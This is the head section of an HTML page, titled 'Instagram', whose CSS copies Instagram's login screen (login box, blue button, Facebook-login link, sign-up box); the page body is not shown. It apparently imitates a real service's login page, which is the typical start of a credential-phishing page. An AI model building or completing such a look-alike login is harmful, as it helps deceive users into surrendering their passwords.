<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #fafafa; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; }
        .box { background-color: #fff; border: 1px solid #dbdbdb; padding: 40px; width: 350px; text-align: center; }
        .logo { margin-bottom: 30px; }
        input { width: 100%; padding: 9px 8px; margin-bottom: 6px; border: 1px solid #dbdbdb; border-radius: 3px; background-color: #fafafa; font-size: 12px; outline: none; }
        input:focus { border-color: #a8a8a8; }
        .btn { width: 100%; padding: 8px; border: none; border-radius: 8px; background-color: #0095f6; color: #fff; font-weight: 600; cursor: pointer; margin-top: 8px; opacity: 1; }
        .or-divider { display: flex; align-items: center; margin: 18px 0; color: #8e8e8e; font-size: 13px; font-weight: 600; }
        .or-divider::before, .or-divider::after { content: ""; flex: 1; height: 1px; background: #dbdbdb; margin: 0 18px; }
        .fb-login { color: #385185; font-size: 14px; font-weight: 600; cursor: pointer; text-decoration: none; display: block; margin-bottom: 20px; }
        .fb-icon { display: inline-block; vertical-align: middle; margin-right: 8px; }
        .forgot { font-size: 12px; color: #00376b; margin-top: 12px; display: block; text-decoration: none; }
        .signup-box { background: #fff; border: 1px solid #dbdbdb; padding: 20px; width: 350px; text-align: center; margin-top: 10px; font-size: 14px; }
        .signup-box a { color: #0095f6; text-decoration: none; font-weight: 600; }
        .get-app { margin-top: 20px; text-align: center; font-size: 14px; }
    </style>
</head>
